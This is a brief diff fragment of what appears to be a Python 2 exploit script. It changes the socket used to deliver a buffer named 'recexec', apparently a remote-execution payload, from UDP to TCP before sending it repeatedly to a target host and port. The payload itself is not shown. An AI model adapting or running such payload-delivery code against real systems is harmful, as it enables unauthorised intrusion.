@@ -117,7 +117,7 @@ print "Target: "+HOST
 recexec=buf
 for i in range(8):
 	try:
-		 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		 s.connect((HOST,PORT))
 		 print "sending: %d bytes" % len(buf)
 		 s.send(buf)
